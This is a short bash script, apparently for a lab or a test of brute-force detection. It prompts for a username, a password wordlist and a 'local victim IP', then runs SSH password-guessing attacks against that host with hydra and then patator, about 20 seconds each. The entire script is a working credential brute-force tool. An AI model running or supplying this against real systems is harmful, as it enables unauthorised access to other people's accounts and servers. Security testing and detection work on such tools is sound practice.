#!/bin/bash

check_program() {
	if ! command -v "$1" &>/dev/null; then
		echo "$1 is not installed. Please install it and try again."
		exit 1
	fi
}

check_program hydra
check_program patator

read -p "Enter your username: " myusername
read -p "Enter the path to your wordlist: " mywordlist
read -p "Enter the local victim IP: " mylocalvictimip

if [ ! -f "$mywordlist" ]; then
	echo "Wordlist file not found. Please provide a valid path to the wordlist."
	exit 1
fi

echo "Running Hydra..."
hydra -l "$myusername" -P "$mywordlist" ssh://"$mylocalvictimip" &
sleep 20
pkill hydra

echo "Running Patator..."
patator ssh_login host="$mylocalvictimip" user="$myusername" password=FILE0 0="$mywordlist" --max-retries 0 --timeout 10 &
sleep 20
pkill patator
